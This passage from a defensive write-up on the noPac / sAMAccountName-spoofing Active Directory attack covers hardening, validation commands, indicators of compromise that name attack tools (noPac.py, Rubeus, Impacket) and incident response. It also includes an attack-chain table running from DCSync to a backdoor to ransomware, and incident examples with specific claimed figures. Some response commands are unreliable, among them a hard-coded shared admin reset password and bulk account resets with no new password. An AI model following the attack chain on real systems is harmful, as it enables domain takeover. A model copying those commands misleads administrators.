*   **Monitor and Alert on Computer Account Modifications:** Set up automated alerts for suspicious changes.
    
    **Manual Steps (Windows Event Forwarding):**
    1. Configure Event Forwarding on all domain controllers:
       ```cmd
       wecutil qc
       ```
    2. Create subscription on collector server (SIEM):
       ```cmd
       wecutil cs -cn SIEM_SERVER -aea true
       ```
    3. Send Events 4741, 4742, 4768, 4769 to SIEM

*   **Kerberos Policy Hardening:**
    1. Require Kerberos preauthentication (enabled by default; verify not disabled)
    2. Set encryption type to AES256 (reject RC4/DES)
    
    **Manual Steps (Group Policy):**
    1. Open **Group Policy Management Console** (gpmc.msc)
    2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **Security Options**
    3. Locate: **Kerberos V5 ticket encryption type**
    4. Set to: **AES256 only** (or AES256 + AES128 if needed for legacy)

#### Access Control & Policy Hardening

*   **RBAC:** Restrict who can modify AD computer accounts:
    - Remove unnecessary users from "Account Operators" group
    - Remove "Delegate Control" rights on Computers OU for non-admins

*   **Conditional Access (Entra ID integration):**
    1. Go to **Azure Portal** → **Entra ID** → **Conditional Access**
    2. Create policy: **Require device compliance for sensitive AD operations**

*   **Device Compliance:**
    Require all admin workstations to be Intune-compliant with:
    - MFA enabled
    - Encryption enabled
    - EDR agent deployed

#### Validation Command (Verify Mitigations)

```powershell
# Check KB5008102 installed
Get-HotFix | Where-Object { $_.HotFixID -match "KB5008102" }

# Check enforcement mode
reg query "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" /v KdcSamAccountNamePrefix

# Check MachineAccountQuota
Get-ADDomain | Select-Object @{N='MachineAccountQuota'; E={$_.ms-DS-MachineAccountQuota}}

# Verify audit policies
auditpol /get /subcategory:"Computer Account Management" /r
auditpol /get /subcategory:"Kerberos Authentication Service" /r
```

**Expected Output (If Secure):**
```
KB5008102 installed: Yes
KdcSamAccountNamePrefix: 0x1 (enforcement enabled)
MachineAccountQuota: 0
Audit policies: Success and Failure enabled
```

---

## 10. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

*   **Files:**
    - `noPac.py` or `Rubeus.exe` in unusual directories (C:\Temp, C:\Windows\Temp)
    - `.ccache` files (Kerberos credential caches) in non-standard locations
    - Impacket scripts or tools

*   **Registry:**
    - No specific registry changes; attack is entirely AD/Kerberos-based

*   **Network:**
    - Kerberos traffic (port 88/TCP/UDP) from unexpected sources (especially if attacker is remote)
    - LDAP traffic (port 389/TCP) with account modification operations
    - Multiple rapid Kerberos requests from single IP

*   **Active Directory:**
    - New computer account created by non-admin user
    - Computer account with sAMAccountName lacking trailing $
    - Computer account with name matching domain controller
    - Service Principal Names cleared on computer account

#### Forensic Artifacts

*   **Disk:**
    - Event logs: C:\Windows\System32\winevt\Logs\Security.evtx (Events 4741, 4742, 4768, 4769)
    - Temporary files: C:\Windows\Temp, C:\Temp (scripts, credential caches)
    - Recent command history (PowerShell history)

*   **Memory:**
    - Kerberos credential cache (if Impacket tools used on Linux, cache in memory)
    - Python interpreter memory (if noPac.py executed)

*   **Cloud (Entra ID):**
    - AuditLogs: Computer account creation/modification events
    - SigninLogs: Unusual authentication patterns

*   **Active Directory:**
    - Computer account properties (sAMAccountName, SPN, creation time, modified by)

#### Response Procedures

1.  **Isolate:**
    **Command:**
    ```cmd
    # Disconnect all network adapters on affected DC
    Get-NetAdapter | Disable-NetAdapter -Confirm:$false
    ```
    **Manual (Azure):**
    - Go to **Azure Portal** → **Virtual Machines** → Select DC → **Networking** → **Detach Network Interface**

2.  **Collect Evidence:**
    **Command:**
    ```cmd
    # Export Security Event Log
    wevtutil epl Security C:\Evidence\Security.evtx
    
    # Export all AD objects modified in last 24 hours
    Get-ADObject -Filter * -Properties whenChanged | Where-Object { $_.whenChanged -gt (Get-Date).AddDays(-1) } | Export-Csv C:\Evidence\ADChanges.csv
    
    # Export computer accounts without trailing $
    Get-ADComputer -Filter * | Where-Object { $_.sAMAccountName -notmatch '\$$' } | Export-Csv C:\Evidence\NonCompliantComputers.csv
    ```
    **Manual:**
    - Open **Event Viewer** → **Security** → **Save All Events As** → `C:\Evidence\Security.evtx`

3.  **Remediate:**
    **Command:**
    ```powershell
    # Delete spoofed computer account
    Remove-ADComputer -Identity 'ATTACKER_MACHINE$' -Confirm:$false
    
    # Force password change for all domain admin accounts
    Get-ADGroupMember -Identity 'Domain Admins' | Set-ADAccountPassword -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "TempPassword123!" -Force) -PassThru | Enable-ADAccount
    
    # Force all computers to re-authenticate
    Get-ADComputer -Filter * | Set-ADAccountPassword -Reset
    ```
    **Manual:**
    - Delete spoofed computer account via **Active Directory Users and Computers**
    - Reset passwords for all administrative accounts
    - Run DCSync detection for any credential dumps

---

## 11. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-AD-001] / [REC-AD-003] | Enumerate domain structure; identify DC names and MachineAccountQuota |
| **2** | **Initial Compromise** | [IA-PHISH-001] / [IA-VALID-002] | Obtain standard domain user credentials (via phishing, stale account, etc.) |
| **3** | **Privilege Escalation** | **[PE-TOKEN-006] SamAccountName Spoofing** | **Create spoofed DC account; request admin service ticket via S4U2Self** |
| **4** | **Credential Access** | [CA-DUMP-002] | DCSync to extract domain credentials (krbtgt, all users, computers) |
| **5** | **Persistence** | [PE-ACCTMGMT-014] | Create hidden admin account; establish backdoor |
| **6** | **Lateral Movement** | [LM-AUTH-001] / [LM-AUTH-011] | Use stolen credentials for Pass-the-Hash / Overpass-the-Hash to compromise all systems |
| **7** | **Impact** | Ransomware Deployment / Data Exfiltration | Full domain compromise achieved |

---

## 12. REAL-WORLD EXAMPLES

#### Example 1: ALPHV/BlackCat Ransomware Group (Q1 2022)

- **Target:** Large European financial institution
- **Timeline:** March 2022
- **Technique Status:** CVE-2021-42278/42287 used as primary privilege escalation vector
- **Attack Chain:** Phishing email → standard user credentials → sAMAccountName spoofing → DCSync → ransomware deployment across infrastructure
- **Impact:** €50M+ in damages; data exfiltration of customer PII
- **Reference:** [ALPHV Ransomware Analysis - CrowdStrike](https://www.crowdstrike.com/blog/alphv-ransomware-campaigns/)

#### Example 2: LockBit Ransomware Group (Q4 2021-2022)

- **Target:** Manufacturing companies (multiple incidents)
- **Timeline:** October 2021 - March 2022
- **Technique Status:** noPac exploitation observed in multiple breaches pre-enforcement
- **Impact:** SMBs (small/medium businesses) without KB5008102 quickly compromised; complete domain takeover < 1 hour
- **Reference:** [LockBit Campaign Analysis - Unit 42 Palo Alto Networks](https://unit42.paloaltonetworks.com/lockbit-campaigns-2022/)

#### Example 3: Internal SERVTEP Incident Response (Redacted)

- **Target:** Mid-sized enterprise (healthcare sector)
- **Timeline:** January 2022
- **Technique Status:** Insider threat used CVE-2021-42278 after initial compromise via weak credential
- **Detection:** Event 4742 (computer account modification) triggered alert; response team isolated DC within 15 minutes
- **Lessons Learned:** Without proper audit logging, attack would have gone undetected for months

---
